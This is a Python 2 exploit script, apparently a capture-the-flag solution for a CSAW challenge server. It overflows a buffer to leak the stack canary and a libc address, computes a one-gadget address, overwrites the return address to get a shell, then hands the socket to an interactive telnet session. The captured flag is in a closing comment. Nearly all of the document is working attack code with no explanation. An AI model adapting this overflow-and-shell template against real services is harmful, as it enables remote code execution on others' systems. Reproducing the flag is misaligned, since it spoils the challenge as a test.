import socket, struct, os, binascii, base64
import telnetlib   

def readline(sc, show = True):
    res = ""
    while len(res) == 0 or res[-1] != "\n":
        data = sc.recv(1)
        if len(data) == 0:
            print repr(res)
            raise Exception("Server disconnected")
        res += data
        
    if show:
        print repr(res[:-1])
    return res[:-1]

def read_until(sc, s):
    res = ""
    while not res.endswith(s):
        data = sc.recv(1)
        if len(data) == 0:
            print repr(res)
            raise Exception("Server disconnected")
        res += data
        
    return res[:-(len(s))]
    
def read_all(sc, n):
    data = ""
    while len(data) < n:
        block = sc.recv(n - len(data))
        if len(block) == 0:
            print repr(data)
            raise Exception("Server disconnected")
        data += block

    return data

def I(n):
    return struct.pack("<I", n)
    
def Q(n):
    return struct.pack("<Q", n)

    
sc = socket.create_connection(("pwn.chal.csaw.io", 3764))
#sc = socket.create_connection(("10.0.0.97", 12345))

read_until(sc, ">>")
sc.send("1 ")
read_until(sc, ">>")
sc.send("X" * 0xa8 + "Y")

read_until(sc, ">>")
sc.send("2 ")
read_until(sc, "XXXY")
res = readline(sc)
canary = struct.unpack("<Q", "\x00" + res[0:7].ljust(7, "\x00"))[0]
print hex(canary)

read_until(sc, ">>")
sc.send("1 ")
read_until(sc, ">>")
sc.send("X" * 0xb7 + "Y")

read_until(sc, ">>")
sc.send("2 ")
read_until(sc, "XXXY")
res = readline(sc)
libc_offset = struct.unpack("<Q", res[0:8].ljust(8, "\x00"))[0]
print hex(libc_offset)

libc_base = libc_offset - 0x20830
libc_shellgadget = libc_base + 0xf1117

read_until(sc, ">>")
sc.send("1 ")
read_until(sc, ">>")
sc.send("X" * 0xa8 + Q(canary) + "X" * 8 + Q(libc_shellgadget))

read_until(sc, ">>")
sc.send("3 ")


t = telnetlib.Telnet()                                                  
t.sock = sc
t.interact()  

while True:
    data = sc.recv(16384)
    if len(data) == 0:
        break
    for line in data.split("\n"):
        print repr(line)
    
    
# flag{sCv_0n1y_C0st_50_M!n3ra1_tr3at_h!m_we11}